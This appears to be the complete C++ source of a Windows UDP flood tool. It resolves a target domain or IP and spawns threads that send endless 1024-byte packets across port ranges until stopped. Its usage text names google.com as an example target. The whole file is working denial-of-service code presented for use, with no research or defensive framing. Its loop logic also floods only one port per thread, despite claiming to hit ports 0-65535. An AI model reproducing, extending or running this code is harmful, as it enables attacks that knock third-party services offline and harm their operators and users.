#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <atomic>
#include <mutex>
#pragma comment(lib, "ws2_32.lib")
const char* inet_ntop(int af, const void* src, char* dst, socklen_t size) {
    struct sockaddr_storage ss;
    unsigned long s = size;
    ZeroMemory(&ss, sizeof(ss));
    ss.ss_family = af;
    switch(af) {
        case AF_INET:
            ((struct sockaddr_in*)&ss)->sin_addr = *(struct in_addr*)src;
            break;
        case AF_INET6:
            ((struct sockaddr_in6*)&ss)->sin6_addr = *(struct in6_addr*)src;
            break;
        default:
            return NULL;
    }
    return (WSAAddressToStringA((struct sockaddr*)&ss, sizeof(ss), NULL, dst, &s) == 0) ? dst : NULL;
}
std::atomic<bool> stop_attack(false);
std::mutex cout_mutex;
std::vector<std::string> get_domain_ips(const std::string& domain) {
    std::vector<std::string> ips;
    struct addrinfo hints, *result;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;  
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    int ret = getaddrinfo(domain.c_str(), NULL, &hints, &result);
    if (ret != 0) {
        std::lock_guard<std::mutex> lock(cout_mutex);
        std::cerr << "Failed to resolve " << domain << ": " << gai_strerror(ret) << std::endl;
        return ips;
    }
    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        char ip_str[INET6_ADDRSTRLEN];
        if (ptr->ai_family == AF_INET) {
            struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)ptr->ai_addr;
            inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
            ips.push_back(std::string(ip_str));
        }
        else if (ptr->ai_family == AF_INET6) {
            struct sockaddr_in6* sockaddr_ipv6 = (struct sockaddr_in6*)ptr->ai_addr;
            inet_ntop(AF_INET6, &(sockaddr_ipv6->sin6_addr), ip_str, INET6_ADDRSTRLEN);
            ips.push_back(std::string(ip_str));
        }
    }
    freeaddrinfo(result);
    return ips;
}
void attack_port(const std::string& target_ip, int port) {
    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target_ip.c_str());
    if (target_addr.sin_addr.s_addr == INADDR_NONE) {
        return;
    }
    char buffer[1024];
    memset(buffer, 'A', sizeof(buffer));
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        return;
    }
    while (!stop_attack) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
    }
    closesocket(sock);
}
void port_attacker(const std::string& target_ip, int start_port, int end_port) {
    for (int port = start_port; port <= end_port && !stop_attack; ++port) {
        attack_port(target_ip, port);
    }
}
void attack_ip(const std::string& target_ip) {
    const int total_ports = 65536;
    const int num_threads = std::thread::hardware_concurrency();
    const int ports_per_thread = total_ports / num_threads;
    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        int start_port = i * ports_per_thread;
        int end_port = (i == num_threads - 1) ? total_ports - 1 : (start_port + ports_per_thread - 1);
        threads.emplace_back(port_attacker, target_ip, start_port, end_port);
    }
    for (auto& t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }
}
int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <target_domain_or_ip>\n";
        std::cout << "Example: " << argv[0] << " google.com\n";
        std::cout << "         " << argv[0] << " 192.168.1.1\n";
        std::cout << "Press Enter to stop the attack\n";
        return 1;
    }
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }
    std::string target = argv[1];
    std::vector<std::string> target_ips;
    bool is_domain = false;
    for (char c : target) {
        if (isalpha(c)) {
            is_domain = true;
            break;
        }
    }
    if (is_domain) {
        target_ips = get_domain_ips(target);
        if (target_ips.empty()) {
            std::cerr << "Failed to resolve domain name: " << target << std::endl;
            WSACleanup();
            return 1;
        }
        std::cout << "Resolved " << target << " to:\n";
        for (const auto& ip : target_ips) {
            std::cout << "  " << ip << std::endl;
        }
    } else {
        target_ips.push_back(target);
    }
    std::cout << "\nStarting continuous UDP flood to " << target 
              << " on all ports (0-65535)\n";
    std::cout << "Press Enter to stop the attack\n\n";
    std::vector<std::thread> ip_threads;
    for (const auto& ip : target_ips) {
        ip_threads.emplace_back(attack_ip, ip);
    }
    std::cout << "Attack in progress... Press Enter to stop: ";
    std::cin.get();
    stop_attack = true;
    for (auto& t : ip_threads) {
        if (t.joinable()) {
            t.join();
        }
    }
    std::cout << "Attack stopped\n";
    WSACleanup();
    return 0;
}
